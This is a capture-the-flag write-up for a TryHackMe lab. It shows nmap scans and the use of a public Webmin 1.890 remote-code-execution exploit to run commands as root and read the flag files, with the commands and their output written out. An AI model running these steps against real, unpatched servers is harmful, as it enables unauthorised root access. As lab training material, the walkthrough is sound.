## Source 

Room link: https://tryhackme.com/room/source

## Initial Access
As always, I ran an aggressive NMAP scan to start. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-25 21:07 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.084s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```
Alongside the aggressive NMAP scan, I wanted to see if there were any high ports. 
```
ajread@aj-ubuntu:~$ nmap -p- [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-25 21:07 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.075s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
10000/tcp open     snet-sensor-mgmt
28051/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 171.06 seconds
```
I first looked at the webserver on port 10000. It appeared to be vulnerable to an RCE exploit that appears to impact the ```/password_change.cgi``` portion of the server. I found a POC on github (```https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py```) and used it to execute code. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 webmin-1.890_exploit.py [REMOTE IP] 10000 whoami


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
root
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
```
I did some looking around running various commands and found a user named ```dark``` with the flag in their home directory. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 webmin-1.890_exploit.py [REMOTE IP]10000 "cat /home/dark/user.txt"


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
THM{[REDACTED]}
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 webmin-1.890_exploit.py [REMOTE IP] 10000 "wc -c /home/dark/user.txt"


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
29 /home/dark/user.txt
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
```
## Privilege Escalation
Since I was already running as root, I could also read the root flag. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 webmin-1.890_exploit.py [REMOTE IP] 10000 "cat /root/root.txt"


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
THM{[REDACTED]}
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 webmin-1.890_exploit.py [REMOTE IP] 10000 "wc -c /root/root.txt"


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
25 /root/root.txt
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
```